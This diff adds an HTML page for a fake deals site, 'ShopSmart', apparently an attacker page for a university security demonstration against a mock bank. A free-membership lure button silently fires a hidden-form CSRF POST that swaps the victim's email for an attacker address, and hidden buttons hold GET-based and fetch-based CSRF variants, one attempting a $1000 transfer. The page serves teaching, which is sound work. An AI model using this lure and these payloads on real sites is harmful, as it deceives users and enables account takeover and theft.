@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ShopSmart - Your Daily Deals Marketplace</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/static/css/shopsmart.css">
+</head>
+<body>
+    <!-- Header -->
+    <div class="marketplace-header">
+        <div class="header-top">
+            <a href="#" class="marketplace-logo">
+                <div class="logo-icon">S</div>
+                <span>ShopSmart</span>
+            </a>
+            <div class="header-nav">
+                <a href="#" class="nav-link">Today's Deals</a>
+                <a href="#" class="nav-link">Electronics</a>
+                <a href="#" class="nav-link">Fashion</a>
+                <a href="#" class="nav-link">Home & Garden</a>
+            </div>
+        </div>
+
+        <!-- Category Navigation -->
+        <div class="category-nav">
+            <a href="#" class="category-link">All Categories</a>
+            <a href="#" class="category-link">🎮 Gaming</a>
+            <a href="#" class="category-link">💻 Computers</a>
+            <a href="#" class="category-link">📱 Phones & Tablets</a>
+            <a href="#" class="category-link">🏠 Smart Home</a>
+            <a href="#" class="category-link">🎧 Audio</a>
+            <a href="#" class="category-link">📷 Cameras</a>
+        </div>
+    </div>
+
+    <!-- PROMO BANNER - CSRF ATTACK TRIGGER -->
+    <div class="promo-banner">
+        <div class="promo-content">
+            <div class="promo-tag">🎁 LIMITED TIME OFFER</div>
+            <h1 class="promo-title">FREE COSTCO GOLD MEMBERSHIP!</h1>
+            <p class="promo-subtitle">
+                Shop today and get a FREE 1-Year Costco Gold Star Membership ($60 value)
+            </p>
+            <div class="promo-timer">
+                ⏰ Offer Ends in: 2:45:17
+            </div>
+            <button class="btn-claim" onclick="claimOffer()">
+                🎁 CLAIM YOUR FREE MEMBERSHIP
+            </button>
+            <p style="margin-top: 1rem; font-size: 0.95rem; opacity: 0.9;">
+                ✓ No purchase required  ✓ Instant activation  ✓ Official Costco partnership
+            </p>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="marketplace-container">
+        <!-- Today's Hot Deals -->
+        <section class="deals-section">
+            <h2 class="section-title">🔥 Today's Hot Deals</h2>
+            <div class="product-grid">
+                <div class="product-card">
+                    <div class="product-image">📱</div>
+                    <div class="product-info">
+                        <div class="product-name">Apple iPhone 15 Pro Max 256GB</div>
+                        <div class="product-rating">
+                            <span class="stars">★★★★★</span>
+                            <span>(4,832 reviews)</span>
+                        </div>
+                        <div class="product-price">$999.99</div>
+                        <div class="product-old-price">$1,199.99</div>
+                        <div class="product-badge">17% OFF</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">💻</div>
+                    <div class="product-info">
+                        <div class="product-name">MacBook Air M3 13" Laptop</div>
+                        <div class="product-rating">
+                            <span class="stars">★★★★★</span>
+                            <span>(2,194 reviews)</span>
+                        </div>
+                        <div class="product-price">$1,049.00</div>
+                        <div class="product-old-price">$1,299.00</div>
+                        <div class="product-badge">19% OFF</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">🎧</div>
+                    <div class="product-info">
+                        <div class="product-name">Sony WH-1000XM5 Wireless Headphones</div>
+                        <div class="product-rating">
+                            <span class="stars">★★★★★</span>
+                            <span>(8,421 reviews)</span>
+                        </div>
+                        <div class="product-price">$349.99</div>
+                        <div class="product-old-price">$399.99</div>
+                        <div class="product-badge">13% OFF</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image" style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);">⌚</div>
+                    <div class="product-info">
+                        <div class="product-name">Apple Watch Series 9 GPS 45mm</div>
+                        <div class="product-rating">
+                            <span class="stars">★★★★☆</span>
+                            <span>(3,651 reviews)</span>
+                        </div>
+                        <div class="product-price">$379.00</div>
+                        <div class="product-old-price">$429.00</div>
+                        <div class="product-badge">12% OFF</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Trust Section -->
+        <section class="trust-section">
+            <div class="trust-grid">
+                <div class="trust-item">
+                    <div class="trust-icon">🚚</div>
+                    <div class="trust-title">Free 2-Day Shipping</div>
+                    <div class="trust-text">On orders over $35</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">🔒</div>
+                    <div class="trust-title">Secure Checkout</div>
+                    <div class="trust-text">SSL encrypted payments</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">↩️</div>
+                    <div class="trust-title">30-Day Returns</div>
+                    <div class="trust-text">Easy returns & exchanges</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">💬</div>
+                    <div class="trust-title">24/7 Support</div>
+                    <div class="trust-text">Here to help anytime</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Configuration Section (for demo/testing) -->
+        <section class="config-section">
+            <h3 class="config-title">⚙️ Demo Configuration (For Testing)</h3>
+            <label for="target-url" style="display: block; margin-bottom: 0.5rem; font-weight: 600;">Target Bank URL:</label>
+            <input type="text" id="target-url" class="config-input" value="http://54.91.136.41:5000"
+                   placeholder="http://54.91.136.41:5000">
+            <p style="font-size: 0.85rem; color: #565959; margin-top: 0.5rem;">
+                Enter the Chaze Bank URL to target with the CSRF attack (vulnerable version: port 5000, secure version: port 5001)
+            </p>
+
+            <!-- Hidden testing buttons -->
+            <div class="attack-buttons" id="test-buttons" style="display: none;">
+                <p style="margin-bottom: 0.5rem; font-weight: 600;">Manual Test Buttons:</p>
+                <button class="btn-attack" onclick="attack1()">Test: GET-based Attack</button>
+                <button class="btn-attack" onclick="attack2()">Test: POST-based Attack</button>
+                <button class="btn-attack" onclick="attack3()">Test: JavaScript Attack</button>
+            </div>
+            <button onclick="document.getElementById('test-buttons').style.display='block'"
+                    style="margin-top: 0.5rem; padding: 0.5rem 1rem; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.85rem;">
+                Show Test Buttons
+            </button>
+        </section>
+    </div>
+
+    <!-- Footer -->
+    <div class="marketplace-footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">About Us</a>
+            <a href="#" class="footer-link">Careers</a>
+            <a href="#" class="footer-link">Investor Relations</a>
+            <a href="#" class="footer-link">Press Center</a>
+            <a href="#" class="footer-link">Terms of Service</a>
+            <a href="#" class="footer-link">Privacy Policy</a>
+        </div>
+        <div class="footer-text">
+            © 2025 ShopSmart, Inc. All rights reserved.<br>
+            <strong>Educational Demo:</strong> This is a simulated attacker site for EEP595 security demonstration.
+        </div>
+    </div>
+
+    <script>
+        function getTargetUrl() {
+            return document.getElementById('target-url').value;
+        }
+
+        // MAIN CSRF ATTACK - Triggered by "Claim Free Membership" button
+        function claimOffer() {
+            const targetUrl = getTargetUrl();
+
+            // Show fake loading
+            const btn = event.target;
+            btn.innerHTML = '<span class="loading"></span> Processing...';
+            btn.disabled = true;
+
+            // Execute CSRF attack
+            setTimeout(() => {
+                attack2(); // POST-based CSRF attack
+
+                // Show fake success message
+                btn.innerHTML = '✓ Membership Claimed!';
+                btn.style.background = '#067d62';
+
+                // Show modal
+                setTimeout(() => {
+                    alert('🎉 Congratulations!\n\nYour FREE Costco Gold Membership has been activated!\n\nCheck your email for confirmation details.');
+                }, 500);
+            }, 1500);
+        }
+
+        // Attack 1: GET-based CSRF (using image tag)
+        function attack1() {
+            const targetUrl = getTargetUrl();
+            const img = document.createElement('img');
+            img.src = targetUrl + '/api/transfer?to=attacker&amount=1000';
+            img.style.display = 'none';
+            img.onload = function() {
+                console.log('✓ GET-based attack sent - $1000 transfer attempted');
+            };
+            img.onerror = function() {
+                console.log('⚠ GET request sent but may have been blocked by ORB');
+            };
+            document.body.appendChild(img);
+        }
+
+        // Attack 2: POST-based CSRF (hidden form submission) - THE MAIN ATTACK
+        function attack2() {
+            const targetUrl = getTargetUrl();
+
+            // Create hidden iframe to submit form silently
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.name = 'csrf-frame';
+            document.body.appendChild(iframe);
+
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = targetUrl + '/api/update_profile_csrf';
+            form.target = 'csrf-frame'; // Submit to hidden iframe
+
+            const emailInput = document.createElement('input');
+            emailInput.name = 'email';
+            emailInput.value = 'attacker@malicious.com';
+            form.appendChild(emailInput);
+
+            const bioInput = document.createElement('input');
+            bioInput.name = 'bio';
+            bioInput.value = 'Account compromised via CSRF attack from ShopSmart!';
+            form.appendChild(bioInput);
+
+            document.body.appendChild(form);
+            form.submit();
+
+            console.log('✓ POST-based CSRF attack executed - check bank dashboard');
+        }
+
+        // Attack 3: JavaScript-based CSRF (fetch API)
+        function attack3() {
+            const targetUrl = getTargetUrl();
+
+            const formData = new FormData();
+            formData.append('email', 'js-attacker@malicious.com');
+            formData.append('bio', 'Compromised via JavaScript CSRF!');
+
+            fetch(targetUrl + '/api/update_profile_csrf', {
+                method: 'POST',
+                body: formData,
+                credentials: 'include'
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✓ JavaScript attack succeeded');
+                } else {
+                    console.log('⚠ Attack may have been blocked');
+                }
+            })
+            .catch(error => {
+                console.log('⚠ Attack blocked by browser CORS policy');
+            });
+        }
+
+        // Countdown timer animation
+        let timeLeft = 9917; // seconds
+        setInterval(() => {
+            timeLeft--;
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            const timerEl = document.querySelector('.promo-timer');
+            if (timerEl) {
+                timerEl.textContent = `⏰ Offer Ends in: ${hours}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
